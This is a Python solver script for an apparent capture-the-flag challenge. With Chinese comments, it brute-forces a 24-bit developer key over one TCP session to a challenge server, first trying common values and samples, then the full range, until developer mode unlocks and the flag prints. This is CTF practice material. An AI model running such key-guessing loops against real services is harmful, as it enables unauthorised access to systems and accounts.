#!/usr/bin/env python3
import socket
import time
import re

def brute_force_in_session():
    """在单个会话中暴力破解dev_key"""
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    print("[+] 在单个会话中暴力破解dev_key...")
    print("[+] dev_key范围: 0x000000 - 0xFFFFFF (0 - 16777215)")
    
    try:
        # 建立连接
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        print(f"[+] 成功连接到 {host}:{port}")
        
        # 接收初始菜单
        initial_menu = s.recv(2048).decode(errors='ignore')
        print(f"[DEBUG] 初始菜单: {initial_menu}")
        
        # 开始暴力破解
        max_value = 0xFFFFFF  # 24位最大值
        step = 1000  # 每1000个打印一次进度
        
        for key in range(0, max_value + 1):
            if key % step == 0:
                progress = (key / max_value) * 100
                print(f"[*] 进度: {key}/{max_value} ({progress:.2f}%) - 测试密钥: {key} (0x{key:06x})")
            
            try:
                # 选择选项1 (View free content)
                s.send(b"1\n")
                time.sleep(0.05)  # 短暂延迟避免过快
                
                # 等待subscription key提示
                prompt = s.recv(1024).decode(errors='ignore')
                if "Enter your subscription key:" not in prompt:
                    print(f"[DEBUG] 意外的提示: {prompt}")
                    # 如果不是预期的提示，可能需要重新同步
                    if "Choice:" in prompt:
                        continue
                    else:
                        break
                
                # 发送当前测试的密钥
                s.send(f"{key}\n".encode())
                # time.sleep(0.05)
                
                # 接收响应
                response = s.recv(2048).decode(errors='ignore')
                
                # 检查是否成功
                if "Developer mode activated!" in response:
                    print(f"\n[SUCCESS] 找到正确的密钥: {key} (0x{key:06x})")
                    print(f"[FLAG] 响应内容:\n{response}")
                    
                    # 尝试获取更多输出（flag可能在后续输出中）
                    time.sleep(1)
                    try:
                        additional_response = s.recv(2048).decode(errors='ignore')
                        if additional_response:
                            print(f"[FLAG] 额外响应:\n{additional_response}")
                    except:
                        pass
                    
                    s.close()
                    return key
                
                # 检查响应是否包含"Choice:"，如果包含说明回到了主菜单
                if "Choice:" not in response:
                    print(f"[DEBUG] 异常响应: {response}")
                    # 如果没有回到主菜单，可能连接有问题
                    break
                    
            except socket.timeout:
                print(f"[ERROR] 测试密钥 {key} 时超时")
                break
            except Exception as e:
                print(f"[ERROR] 测试密钥 {key} 时出错: {e}")
                break
        
        s.close()
        print(f"[-] 暴力破解完成，未找到正确密钥")
        return None
        
    except Exception as e:
        print(f"[ERROR] 连接失败: {e}")
        return None

def optimized_brute_force():
    """优化的暴力破解 - 从常见值和中间值开始"""
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    print("[+] 优化的暴力破解策略...")
    
    # 生成测试序列：从常见值开始，然后是随机分布
    test_sequence = []
    
    # 1. 常见的小值
    test_sequence.extend(range(0, 1000))
    
    # 2. 常见的hex值
    common_hex = [0x1337, 0xDEAD, 0xBEEF, 0xCAFE, 0xFACE, 0xDEADBEEF & 0xFFFFFF]
    test_sequence.extend(common_hex)
    
    # 3. 分段采样：将0xFFFFFF分成1000段，每段测试几个值
    max_val = 0xFFFFFF
    segments = 1000
    segment_size = max_val // segments
    
    for i in range(segments):
        base = i * segment_size
        # 每段测试开头、中间和结尾几个值
        test_sequence.extend([base, base + segment_size//2, base + segment_size - 1])
    
    # 去重并排序
    test_sequence = list(set(test_sequence))
    test_sequence = [x for x in test_sequence if 0 <= x <= 0xFFFFFF]
    
    print(f"[*] 总共测试 {len(test_sequence)} 个值")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((host, port))
        print(f"[+] 连接成功")
        
        # 接收初始菜单
        s.recv(2048)
        
        for i, key in enumerate(test_sequence):
            if i % 100 == 0:
                progress = (i / len(test_sequence)) * 100
                print(f"[*] 进度: {i}/{len(test_sequence)} ({progress:.1f}%) - 测试: {key} (0x{key:06x})")
            
            try:
                s.send(b"1\n")
                time.sleep(0.03)
                
                prompt = s.recv(1024).decode(errors='ignore')
                if "subscription key" not in prompt.lower():
                    if "Choice:" in prompt:
                        continue
                    else:
                        print(f"[DEBUG] 异常提示，重新连接: {prompt}")
                        break
                
                s.send(f"{key}\n".encode())
                time.sleep(0.03)
                
                response = s.recv(2048).decode(errors='ignore')
                
                if "Developer mode activated!" in response:
                    print(f"\n[SUCCESS] 密钥: {key} (0x{key:06x})")
                    print(f"[FLAG] {response}")
                    
                    # 获取flag内容
                    time.sleep(0.5)
                    try:
                        flag_response = s.recv(2048).decode(errors='ignore')
                        print(f"[FLAG] {flag_response}")
                    except:
                        pass
                    
                    s.close()
                    return key
                    
            except Exception as e:
                print(f"[ERROR] 密钥 {key}: {e}")
                break
        
        s.close()
        return None
        
    except Exception as e:
        print(f"[ERROR] 连接失败: {e}")
        return None

if __name__ == "__main__":
    print("[+] Ghost in the Stack - 单会话暴力破解")
    print("[+] 策略: 在单个TCP连接中测试所有可能的dev_key值")
    
    # 先尝试优化的方法
    result = optimized_brute_force()
    
    if result is None:
        print("\n[+] 优化方法失败，尝试完整暴力破解...")
        result = brute_force_in_session()
    
    if result is not None:
        print(f"\n[SUCCESS] 成功找到密钥: {result} (0x{result:06x})")
    else:
        print("\n[-] 暴力破解失败")